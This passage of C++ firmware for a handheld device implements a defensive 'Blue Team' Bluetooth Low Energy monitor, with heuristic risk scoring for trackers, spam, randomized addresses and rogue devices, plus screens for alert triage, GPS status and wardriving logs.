    if (item.changed) item.riskScore += 10;
    if (item.randomAddress) {
      item.churnSuspect = true;
      item.riskScore += 20;
    }
    if (item.noName) item.riskScore += 8;
    if (item.serviceRich) item.riskScore += 6;
    if (item.manufacturerLen > 20) item.riskScore += 8;
    if (item.serviceCount >= 3) item.riskScore += 8;
    if (item.roleHint == "tracker") {
      item.trackerSuspect = true;
      item.riskScore += 22;
    }
    if (item.noName && item.manufacturerLen > 12) {
      item.beaconSuspect = true;
      item.riskScore += 16;
    }
  }

  for (int i = 0; i < g_bleCount; ++i) {
    int sameNameCount = 0;
    for (int j = 0; j < g_bleCount; ++j) {
      if (i != j && g_bleItems[i].name.length() > 0 && g_bleItems[i].name == g_bleItems[j].name) {
        ++sameNameCount;
      }
    }
    if (sameNameCount >= 2) {
      g_bleItems[i].spamSuspect = true;
      g_bleItems[i].riskScore += 18;
    }
    if (g_bleScanGeneration > 2 && g_bleItems[i].isNew && g_bleItems[i].rssi >= -70) {
      g_bleItems[i].rogueSuspect = true;
      g_bleItems[i].riskScore += 18;
    }
    if (g_bleNewCount >= 10 && g_bleItems[i].isNew) {
      g_bleItems[i].spamSuspect = true;
      g_bleItems[i].riskScore += 16;
    }
    if (sameNameCount >= 3 && g_bleItems[i].randomAddress) {
      g_bleItems[i].churnSuspect = true;
      g_bleItems[i].riskScore += 18;
    }
    if (g_bleItems[i].riskScore > 99) g_bleItems[i].riskScore = 99;
    if (g_bleItems[i].spamSuspect) ++g_bleSpamCount;
  }
}

void runBleScan() {
  BleScanItem previous[40];
  const int previousCount = g_bleCount;
  for (int i = 0; i < previousCount; ++i) previous[i] = g_bleItems[i];

  g_bleCount = 0;
  g_bleNewCount = 0;
  g_bleChangedCount = 0;
  g_bleSpamCount = 0;
  ++g_bleScanGeneration;

  if (!g_bleReady) {
    BLEDevice::init("");
    g_bleReady = true;
  }

  BLEScan* scanner = BLEDevice::getScan();
  scanner->setActiveScan(false);
  scanner->setInterval(120);
  scanner->setWindow(80);
  BLEScanResults results = scanner->start(2, false);
  const int found = results.getCount();
  const int limit = found < 40 ? found : 40;

  for (int i = 0; i < limit; ++i) {
    BLEAdvertisedDevice device = results.getDevice(i);
    String name = device.haveName() ? String(device.getName().c_str()) : String("");
    String address = String(device.getAddress().toString().c_str());
    const int serviceCount = device.haveServiceUUID() ? 1 : 0;
    BleScanItem item = {
        name,
        address,
        bleVendorHint(address),
        bleRoleHint(name),
        device.getRSSI(),
        device.getRSSI(),
        true,
        false,
        isLocallyAdministeredMac(address),
        name.length() == 0,
        device.haveServiceUUID(),
        false,
        false,
        false,
        false,
        false,
        device.haveManufacturerData() ? static_cast<int>(device.getManufacturerData().length()) : 0,
        serviceCount,
        0,
        g_bleScanGeneration,
        g_bleScanGeneration,
    };

    for (int p = 0; p < previousCount; ++p) {
      if (previous[p].address == item.address) {
        item.isNew = false;
        item.firstSeenScan = previous[p].firstSeenScan;
        item.prevRssi = previous[p].rssi;
        item.changed = abs(previous[p].rssi - item.rssi) >= 10 || previous[p].name != item.name;
        if (item.changed) ++g_bleChangedCount;
        break;
      }
    }
    if (item.isNew) ++g_bleNewCount;
    g_bleItems[g_bleCount++] = item;
  }

  scoreBleThreats();
  sortBleItems();
  rebuildBleThreatFeedIndices();
  if (g_bleSelected >= g_bleCount) g_bleSelected = g_bleCount > 0 ? g_bleCount - 1 : 0;
  if (g_bleSelected < 0) g_bleSelected = 0;
  if (g_bleScroll > g_bleSelected) g_bleScroll = g_bleSelected;
  if (g_bleSelected >= g_bleScroll + kBleVisibleRows) {
    g_bleScroll = g_bleSelected - kBleVisibleRows + 1;
  }
  scanner->clearResults();
}

void drawBleListScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  const uint16_t soft = themeModeSoft(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setCursor(8, 8);
  M5.Display.println("Blue Team BLE Mon");
  drawBatteryWidget(panel, 132);
  M5.Display.setTextColor(kDimText, panel);
  M5.Display.setCursor(174, 8);
  M5.Display.println("inspect");

  M5.Display.fillRoundRect(8, 28, 224, 92, 10, kPanelAlt);
  M5.Display.drawRoundRect(8, 28, 224, 92, 10, accent);
  M5.Display.setTextColor(kGold, kPanelAlt);
  M5.Display.setCursor(14, 36);
  M5.Display.printf("DEV:%d", g_bleCount);
  M5.Display.setCursor(72, 36);
  M5.Display.printf("N:%d", g_bleNewCount);
  M5.Display.setCursor(108, 36);
  M5.Display.printf("C:%d", g_bleChangedCount);
  M5.Display.setCursor(144, 36);
  M5.Display.printf("S:%d", g_bleSpamCount);
  M5.Display.setCursor(184, 36);
  M5.Display.printf("%s", bleSortLabel());

  if (g_bleCount <= 0) {
    M5.Display.setTextColor(kText, kPanelAlt);
    M5.Display.setCursor(14, 54);
    M5.Display.println("No BLE devices");
  } else {
    M5.Display.setTextColor(accent, kPanelAlt);
    M5.Display.setCursor(14, 48);
    M5.Display.println("! NAME        RSSI RK");
    const int end = (g_bleScroll + kBleVisibleRows < g_bleCount) ? (g_bleScroll + kBleVisibleRows) : g_bleCount;
    for (int i = g_bleScroll; i < end; ++i) {
      const int row = i - g_bleScroll;
      const int y = 58 + (row * 9);
      String name = g_bleItems[i].name;
      if (name.length() > 10) {
        name = name.substring(0, 10);
      } else if (name.length() == 0) {
        name = "<anon>";
      }
      if (i == g_bleSelected) {
        M5.Display.fillRoundRect(12, y - 1, 216, 8, 4, accent);
        M5.Display.setTextColor(WHITE, accent);
      } else {
        M5.Display.setTextColor(kText, kPanelAlt);
      }
      char marker = '.';
      if (g_bleItems[i].trackerSuspect) marker = 'T';
      else if (g_bleItems[i].spamSuspect) marker = 'S';
      else if (g_bleItems[i].churnSuspect) marker = 'M';
      else if (g_bleItems[i].beaconSuspect) marker = 'B';
      else if (g_bleItems[i].rogueSuspect) marker = 'R';
      else if (g_bleItems[i].isNew) marker = '+';
      else if (g_bleItems[i].changed) marker = '*';
      M5.Display.setCursor(14, y);
      M5.Display.printf("%c %-10s %4d %2d", marker, name.c_str(), g_bleItems[i].rssi,
                        g_bleItems[i].riskScore);
    }
    M5.Display.setTextColor(soft, kPanelAlt);
    M5.Display.setCursor(176, 48);
    M5.Display.printf("%d/%d", g_bleSelected + 1, g_bleCount);
  }

  M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println("Ent:info ;/.:move Fn+S:sort Fn+R:scan");
}

void drawBleDetailScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  const BleScanItem& item = g_bleItems[g_bleSelected];

  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setCursor(8, 8);
  M5.Display.println("BLE Device Detail");
  drawBatteryWidget(panel, 132);

  M5.Display.fillRoundRect(8, 28, 224, 92, 10, kPanelAlt);
  M5.Display.drawRoundRect(8, 28, 224, 92, 10, accent);
  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 36);
  M5.Display.println("Name");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(56, 36);
  M5.Display.printf("%.9s", item.name.length() ? item.name.c_str() : "<anon>");

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 50);
  M5.Display.println("RSSI");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(56, 50);
  M5.Display.printf("%d (%+d)", item.rssi, item.rssi - item.prevRssi);

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 64);
  M5.Display.println("Risk");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(56, 64);
  M5.Display.printf("%d", item.riskScore);

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 78);
  M5.Display.println("Flags");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(56, 78);
  if (item.trackerSuspect) M5.Display.print("T");
  if (item.spamSuspect) M5.Display.print("S");
  if (item.churnSuspect) M5.Display.print("M");
  if (item.beaconSuspect) M5.Display.print("B");
  if (item.rogueSuspect) M5.Display.print("R");
  if (item.noName) M5.Display.print("N");
  if (item.serviceRich) M5.Display.print("V");
  if (!item.trackerSuspect && !item.spamSuspect && !item.churnSuspect &&
      !item.beaconSuspect && !item.rogueSuspect && !item.noName && !item.serviceRich) {
    M5.Display.print(".");
  }

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(116, 36);
  M5.Display.println("Vend");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(154, 36);
  M5.Display.printf("%.14s", item.vendorHint.c_str());

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(116, 50);
  M5.Display.println("Role");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(154, 50);
  M5.Display.printf("%.14s", item.roleHint.c_str());

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(116, 64);
  M5.Display.println("Svc");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(154, 64);
  M5.Display.printf("%d/%d", item.serviceCount, item.manufacturerLen);

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 92);
  M5.Display.println("Seen");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(56, 92);
  M5.Display.printf("%lu/%lu", static_cast<unsigned long>(item.firstSeenScan),
                    static_cast<unsigned long>(item.lastSeenScan));

  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 106);
  M5.Display.println("Addr");
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(56, 106);
  M5.Display.println(item.address);

  M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println("Ent list  Fn+Bk back  Tab+Bk");
}

const char* kBlueBleMenuItems[] = {
    "Device Watch",
    "Tracker Hunt",
    "UUID Intel",
    "Threat Feed",
};

const char* blueBleMenuDesc(int index) {
  switch (index) {
    case 0: return "Full device list / inspect";
    case 1: return "Track likely tags / movers";
    case 2: return "Vendor / role / svc clues";
    case 3: return "High-risk BLE findings";
    default: return "";
  }
}

void drawBlueBleMenuScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  const uint16_t soft = themeModeSoft(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setCursor(8, 8);
  M5.Display.println("Blue Team BLE Mon");
  drawBatteryWidget(panel, 132);
  M5.Display.setTextColor(kDimText, panel);
  M5.Display.setCursor(172, 8);
  M5.Display.println("toolbox");

  M5.Display.fillRoundRect(8, 28, 224, 92, 10, kPanelAlt);
  M5.Display.drawRoundRect(8, 28, 224, 92, 10, accent);

  M5.Display.setTextColor(kGold, kPanelAlt);
  M5.Display.setCursor(14, 36);
  M5.Display.printf("DEV:%d N:%d C:%d S:%d", g_bleCount, g_bleNewCount, g_bleChangedCount, g_bleSpamCount);

  for (int i = 0; i < 4; ++i) {
    const int y = 50 + (i * 14);
    if (i == g_blueBleMenuIndex) {
      M5.Display.fillRoundRect(12, y - 2, 216, 12, 5, accent);
      M5.Display.setTextColor(WHITE, accent);
    } else {
      M5.Display.setTextColor(kText, kPanelAlt);
    }
    M5.Display.setCursor(16, y);
    M5.Display.print(i + 1);
    M5.Display.print(". ");
    M5.Display.println(kBlueBleMenuItems[i]);
  }

  M5.Display.setTextColor(soft, kPanelAlt);
  M5.Display.setCursor(14, 108);
  M5.Display.println(blueBleMenuDesc(g_blueBleMenuIndex));

  M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println("Ent open ;/. move Fn+R scan");
}

void drawBlueBleTrackerScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setCursor(8, 8);
  M5.Display.println("Tracker Hunt");
  drawBatteryWidget(panel, 132);

  M5.Display.fillRoundRect(8, 28, 224, 92, 10, kPanelAlt);
  M5.Display.drawRoundRect(8, 28, 224, 92, 10, accent);
  M5.Display.setTextColor(kGold, kPanelAlt);
  int trackerCount = 0;
  int strongestIdx = -1;
  for (int i = 0; i < g_bleCount; ++i) {
    if (!g_bleItems[i].trackerSuspect) continue;
    ++trackerCount;
    if (strongestIdx < 0 || g_bleItems[i].rssi > g_bleItems[strongestIdx].rssi) strongestIdx = i;
  }
  M5.Display.setCursor(14, 36);
  M5.Display.printf("Trackers:%d", trackerCount);
  M5.Display.setCursor(14, 52);
  M5.Display.printf("Randomized:%d", 0);
  int randomCount = 0;
  for (int i = 0; i < g_bleCount; ++i) if (g_bleItems[i].randomAddress) ++randomCount;
  M5.Display.setCursor(14, 52);
  M5.Display.printf("Randomized:%d", randomCount);
  M5.Display.setCursor(14, 68);
  M5.Display.printf("Spam:%d", g_bleSpamCount);
  M5.Display.setCursor(14, 84);
  if (strongestIdx >= 0) {
    String name = g_bleItems[strongestIdx].name.length() ? g_bleItems[strongestIdx].name : String("<anon>");
    if (name.length() > 18) name = name.substring(0, 18);
    M5.Display.printf("Hot:%s %ddBm", name.c_str(), g_bleItems[strongestIdx].rssi);
  } else {
    M5.Display.println("No tracker suspect yet");
  }
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(14, 100);
  M5.Display.println("r=rescan to refresh hunt");

  M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println("Fn+Bk back  Fn+R scan");
}

void drawBlueBleUuidScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setCursor(8, 8);
  M5.Display.println("UUID Intel");
  drawBatteryWidget(panel, 132);

  M5.Display.fillRoundRect(8, 28, 224, 92, 10, kPanelAlt);
  M5.Display.drawRoundRect(8, 28, 224, 92, 10, accent);
  int serviceRich = 0;
  int anon = 0;
  int wearable = 0;
  int mobile = 0;
  for (int i = 0; i < g_bleCount; ++i) {
    if (g_bleItems[i].serviceRich) ++serviceRich;
    if (g_bleItems[i].noName) ++anon;
    if (g_bleItems[i].roleHint == "wearable") ++wearable;
    if (g_bleItems[i].roleHint == "mobile") ++mobile;
  }
  M5.Display.setTextColor(kGold, kPanelAlt);
  M5.Display.setCursor(14, 36);
  M5.Display.printf("Svc-rich:%d", serviceRich);
  M5.Display.setCursor(14, 52);
  M5.Display.printf("Anonymous:%d", anon);
  M5.Display.setCursor(14, 68);
  M5.Display.printf("Wearable:%d", wearable);
  M5.Display.setCursor(14, 84);
  M5.Display.printf("Mobile:%d", mobile);
  M5.Display.setTextColor(kText, kPanelAlt);
  M5.Display.setCursor(14, 100);
  M5.Display.println("Use Device Watch for detail");

  M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println("Fn+Bk back  Fn+R scan");
}

void drawBlueBleThreatScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setCursor(8, 8);
  M5.Display.println("BLE Threat Feed");
  drawBatteryWidget(panel, 132);

  M5.Display.fillRoundRect(8, 28, 224, 92, 10, kPanelAlt);
  M5.Display.drawRoundRect(8, 28, 224, 92, 10, accent);
  M5.Display.setTextColor(accent, kPanelAlt);
  M5.Display.setCursor(14, 36);
  M5.Display.println("! NAME        RK");
  for (int row = 0; row < g_bleThreatCount && row < 6; ++row) {
    const int i = g_bleThreatIndices[row];
    String name = g_bleItems[i].name.length() ? g_bleItems[i].name : String("<anon>");
    if (name.length() > 12) name = name.substring(0, 12);
    int y = 48 + (row * 10);
    if (row == g_bleThreatSelected) {
      M5.Display.fillRoundRect(12, y - 1, 216, 8, 4, accent);
      M5.Display.setTextColor(WHITE, accent);
    } else {
      M5.Display.setTextColor(kText, kPanelAlt);
    }
    char marker = g_bleItems[i].trackerSuspect ? 'T' :
                  g_bleItems[i].spamSuspect ? 'S' :
                  g_bleItems[i].churnSuspect ? 'M' :
                  g_bleItems[i].beaconSuspect ? 'B' :
                  g_bleItems[i].rogueSuspect ? 'R' : '!';
    M5.Display.setCursor(14, y);
    M5.Display.printf("%c %-12s %2d", marker, name.c_str(), g_bleItems[i].riskScore);
  }
  if (g_bleThreatCount == 0) {
    M5.Display.setTextColor(kText, kPanelAlt);
    M5.Display.setCursor(14, 54);
    M5.Display.println("No high-risk BLE findings");
  } else {
    M5.Display.setTextColor(accent, kPanelAlt);
    M5.Display.setCursor(182, 36);
    M5.Display.printf("%d/%d", g_bleThreatSelected + 1, g_bleThreatCount);
  }

  M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
  M5.Display.setTextColor(kDimText, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println("Ent:detail ;/.:move Fn+R:scan");
}

void drawBleMonitorScreen(TeamMode mode) {
  switch (g_blueBleView) {
    case BlueBleView::Menu:
      drawBlueBleMenuScreen(mode);
      break;
    case BlueBleView::DeviceWatch:
      if (g_bleCount == 0) runBleScan();
      drawBleListScreen(mode);
      break;
    case BlueBleView::Detail:
      if (g_bleCount == 0) runBleScan();
      drawBleDetailScreen(mode);
      break;
    case BlueBleView::TrackerHunt:
      if (g_bleCount == 0) runBleScan();
      drawBlueBleTrackerScreen(mode);
      break;
    case BlueBleView::UuidIntel:
      if (g_bleCount == 0) runBleScan();
      drawBlueBleUuidScreen(mode);
      break;
    case BlueBleView::ThreatFeed:
      if (g_bleCount == 0) runBleScan();
      drawBlueBleThreatScreen(mode);
      break;
  }
}

void sortAlertItems() {
  for (int i = 0; i < g_alertCount - 1; ++i) {
    for (int j = i + 1; j < g_alertCount; ++j) {
      if (g_alertItems[j].riskScore > g_alertItems[i].riskScore) {
        AlertItem temp = g_alertItems[i];
        g_alertItems[i] = g_alertItems[j];
        g_alertItems[j] = temp;
      }
    }
  }
}

void buildAlertFeed() {
  g_alertCount = 0;

  for (int i = 0; i < g_wifiCount && g_alertCount < 32; ++i) {
    if (g_wifiItems[i].riskScore < 18) continue;
    String label = g_wifiItems[i].ssid.length() ? g_wifiItems[i].ssid : String("<hidden>");
    if (label.length() > 12) label = label.substring(0, 12);
    g_alertItems[g_alertCount++] = {
        AlertSource::Wifi,
        i,
        g_wifiItems[i].riskScore,
        label,
        wifiAlertReason(g_wifiItems[i]),
    };
  }

  for (int i = 0; i < g_bleCount && g_alertCount < 32; ++i) {
    if (g_bleItems[i].riskScore < 18) continue;
    String label = g_bleItems[i].name.length() ? g_bleItems[i].name : String("<anon>");
    if (label.length() > 12) label = label.substring(0, 12);
    g_alertItems[g_alertCount++] = {
        AlertSource::Ble,
        i,
        g_bleItems[i].riskScore,
        label,
        bleAlertReason(g_bleItems[i]),
    };
  }

  sortAlertItems();
  if (g_alertSelected >= g_alertCount) g_alertSelected = g_alertCount > 0 ? g_alertCount - 1 : 0;
  if (g_alertSelected < 0) g_alertSelected = 0;
  if (g_alertScroll > g_alertSelected) g_alertScroll = g_alertSelected;
  if (g_alertSelected >= g_alertScroll + kBleVisibleRows) {
    g_alertScroll = g_alertSelected - kBleVisibleRows + 1;
  }
}

void drawGpsMenuScreen(TeamMode mode) {
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, themeModePanel(mode));
  M5.Display.drawFastHLine(0, 22, kScreenW, themeModeAccent(mode));
  M5.Display.setTextColor(kGold, themeModePanel(mode));
  M5.Display.setCursor(8, 8);
  M5.Display.println("Blue Team GPS");
  drawBatteryWidget(themeModePanel(mode), 132);
  M5.Display.setTextColor(kDimText, themeModePanel(mode));
  M5.Display.setCursor(180, 8);
  M5.Display.println("gps");

  drawBluePanelFrame(8, 28, 224, 92, themeModeAccent(mode));
  const char* items[] = {"Status", "Tracker", "Wardriving"};
  for (int i = 0; i < 3; ++i) {
    const int y = 42 + (i * 18);
    if (i == g_blueGpsMenuIndex) {
      M5.Display.fillRoundRect(18, y - 2, 204, 14, 6, themeModeAccent(mode));
      M5.Display.setTextColor(WHITE, themeModeAccent(mode));
    } else {
      M5.Display.setTextColor(kText, themeModePanel(mode));
    }
    M5.Display.setCursor(24, y);
    M5.Display.print(i + 1);
    M5.Display.print(". ");
    M5.Display.println(items[i]);
  }
  M5.Display.setTextColor(themeModeSoft(mode), themeModePanel(mode));
  M5.Display.setCursor(18, 102);
  M5.Display.println("Ent go  ;/. pick  Fn+Bk back");
}

void drawGpsStatusScreen(TeamMode mode) {
  const float altValue = gpsDisplayAltitude();
  const float speedValue = gpsDisplaySpeed(g_gpsFix.speedKmph);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, themeModePanel(mode));
  M5.Display.drawFastHLine(0, 22, kScreenW, themeModeAccent(mode));
  M5.Display.setTextColor(kGold, themeModePanel(mode));
  M5.Display.setCursor(8, 8);
  M5.Display.println("Blue GPS Status");
  drawBatteryWidget(themeModePanel(mode), 132);

  drawBluePanelFrame(8, 28, 224, 92, themeModeAccent(mode));
  M5.Display.setTextColor(kGold, themeModePanel(mode));
  M5.Display.setCursor(18, 38);
  M5.Display.printf("Fix:%s Sats:%d", g_gpsFix.valid ? "LOCK" : "SEARCH", g_gpsFix.satellites);
  M5.Display.setTextColor(kText, themeModePanel(mode));
  M5.Display.setCursor(18, 52);
  M5.Display.printf("Lat %.5f", g_gpsFix.latitude);
  M5.Display.setCursor(18, 64);
  M5.Display.printf("Lon %.5f", g_gpsFix.longitude);
  M5.Display.setCursor(18, 76);
  M5.Display.printf("Alt %.0f%s Spd %.1f", altValue, gpsAltUnit(), speedValue);
  M5.Display.setCursor(18, 88);
  M5.Display.printf("Crs %.0f Age %lu", g_gpsFix.courseDeg,
                    g_gpsFix.ageMs == 0xFFFFFFFFUL ? 0UL : static_cast<unsigned long>(g_gpsFix.ageMs));
  M5.Display.setCursor(18, 100);
  M5.Display.printf("%s %s", g_gpsFix.dateText, g_gpsFix.timeText);
  M5.Display.setTextColor(themeModeSoft(mode), themeModePanel(mode));
  M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println("Fn+R refresh  Fn+Bk back");
}

void drawGpsTrackerScreen(TeamMode mode) {
  const float tripValue = gpsDisplayDistance(g_gpsTripMeters);
  const float maxSpeedValue = gpsDisplaySpeed(g_gpsMaxSpeedKmph);
  const float nowSpeedValue = gpsDisplaySpeed(g_gpsFix.speedKmph);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, themeModePanel(mode));
  M5.Display.drawFastHLine(0, 22, kScreenW, themeModeAccent(mode));
  M5.Display.setTextColor(kGold, themeModePanel(mode));
  M5.Display.setCursor(8, 8);
  M5.Display.println("Blue GPS Tracker");
  drawBatteryWidget(themeModePanel(mode), 132);

  drawBluePanelFrame(8, 28, 224, 92, themeModeAccent(mode));
  M5.Display.setTextColor(kGold, themeModePanel(mode));
  M5.Display.setCursor(18, 38);
  M5.Display.printf("Track:%s Fix:%lu", g_gpsTrackerLogging ? "LOG" : "IDLE",
                    static_cast<unsigned long>(g_gpsFixCount));
  M5.Display.setTextColor(kText, themeModePanel(mode));
  M5.Display.setCursor(18, 52);
  M5.Display.printf("Trip %.1f%s", tripValue, gpsDistUnit());
  M5.Display.setCursor(18, 64);
  M5.Display.printf("Max %.1f %s", maxSpeedValue, gpsSpeedUnit());
  M5.Display.setCursor(18, 76);
  M5.Display.printf("Now %.1f %s %.0f deg", nowSpeedValue, gpsSpeedUnit(), g_gpsFix.courseDeg);
  M5.Display.setCursor(18, 88);
  M5.Display.printf("Lat %.4f", g_gpsFix.latitude);
  M5.Display.setCursor(18, 100);
  M5.Display.printf("Log %.20s", gpsLastLogName().c_str());
  M5.Display.setTextColor(themeModeSoft(mode), themeModePanel(mode));
  M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println("Fn+S log Fn+R mark Fn+Bk");
}

void drawGpsWardriveScreen(TeamMode mode) {
  const float speedValue = gpsDisplaySpeed(g_gpsFix.speedKmph);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, themeModePanel(mode));
  M5.Display.drawFastHLine(0, 22, kScreenW, themeModeAccent(mode));
  M5.Display.setTextColor(kGold, themeModePanel(mode));
  M5.Display.setCursor(8, 8);
  M5.Display.println("Blue Wardriving");
  drawBatteryWidget(themeModePanel(mode), 132);

  drawBluePanelFrame(8, 28, 224, 92, themeModeAccent(mode));
  M5.Display.setTextColor(kGold, themeModePanel(mode));
  M5.Display.setCursor(18, 38);
  M5.Display.printf("Ward:%s APs:%d", g_gpsWardriveLogging ? "LOG" : "IDLE", g_wifiCount);
  M5.Display.setTextColor(kText, themeModePanel(mode));
  M5.Display.setCursor(18, 52);
  M5.Display.printf("Open:%d Threat:%d", g_wifiOpenCount, g_wifiThreatCount);
  M5.Display.setCursor(18, 64);
  M5.Display.printf("Lat %.4f", g_gpsFix.latitude);
  M5.Display.setCursor(18, 76);
  M5.Display.printf("Sats:%d Spd:%.1f %s", g_gpsFix.satellites, speedValue, gpsSpeedUnit());
  M5.Display.setCursor(18, 88);
  M5.Display.printf("Log %.20s", gpsLastLogName().c_str());
  M5.Display.setCursor(18, 100);
  M5.Display.println("Fn+R sample WiFi+GPS");
  M5.Display.setTextColor(themeModeSoft(mode), themeModePanel(mode));
  M5.Display.fillRect(8, 124, 224, 10, themeModeBg(mode));
  M5.Display.setCursor(12, 126);
  M5.Display.println("Fn+S log  Fn+Bk back");
}

void drawGpsMonitorScreen(TeamMode mode) {
  refreshGpsState();
  switch (g_blueGpsView) {
    case BlueGpsView::Menu:
      drawGpsMenuScreen(mode);
      break;
    case BlueGpsView::Status:
      drawGpsStatusScreen(mode);
      break;
    case BlueGpsView::Tracker:
      drawGpsTrackerScreen(mode);
      break;
    case BlueGpsView::Wardriving:
      drawGpsWardriveScreen(mode);
      break;
  }
}

void drawAlertsListScreen(TeamMode mode) {
  const uint16_t accent = themeModeAccent(mode);
  const uint16_t panel = themeModePanel(mode);
  const uint16_t soft = themeModeSoft(mode);
  M5.Display.setTextWrap(false);
  M5.Display.fillScreen(themeModeBg(mode));
  M5.Display.fillRect(0, 0, kScreenW, 22, panel);
  M5.Display.drawFastHLine(0, 22, kScreenW, accent);
  M5.Display.setTextColor(kGold, panel);
  M5.Display.setCursor(8, 8);
  M5.Display.println("Blue Team Alerts");
  drawBatteryWidget(panel, 132);
  M5.Display.setTextColor(kDimText, panel);
  M5.Display.setCursor(174, 8);
  M5.Display.println("triage");

  M5.Display.fillRoundRect(8, 28, 224, 92, 10, kPanelAlt);
  M5.Display.drawRoundRect(8, 28, 224, 92, 10, accent);
  M5.Display.setTextColor(kGold, kPanelAlt);
  M5.Display.setCursor(14, 36);
  M5.Display.printf("AL:%d", g_alertCount);
  M5.Display.setCursor(72, 36);
  M5.Display.printf("WF:%d", g_wifiCount);
  M5.Display.setCursor(126, 36);
  M5.Display.printf("BL:%d", g_bleCount);

  if (g_alertCount <= 0) {
    M5.Display.setTextColor(kText, kPanelAlt);
    M5.Display.setCursor(14, 56);
    M5.Display.println("No priority alerts");
    M5.Display.setCursor(14, 68);
    M5.Display.println("Scan WiFi/BLE and rescan");
  } else {
    M5.Display.setTextColor(accent, kPanelAlt);
    M5.Display.setCursor(14, 48);
    M5.Display.println("S SRC LABEL        RS WHY");
    const int end = (g_alertScroll + kBleVisibleRows < g_alertCount) ? (g_alertScroll + kBleVisibleRows) : g_alertCount;
    for (int i = g_alertScroll; i < end; ++i) {
      const int row = i - g_alertScroll;
      const int y = 58 + (row * 9);
      String label = g_alertItems[i].label;
      if (label.length() > 12) label = label.substring(0, 12);
      if (i == g_alertSelected) {
        M5.Display.fillRoundRect(12, y - 1, 216, 8, 4, accent);
        M5.Display.setTextColor(WHITE, accent);
      } else {
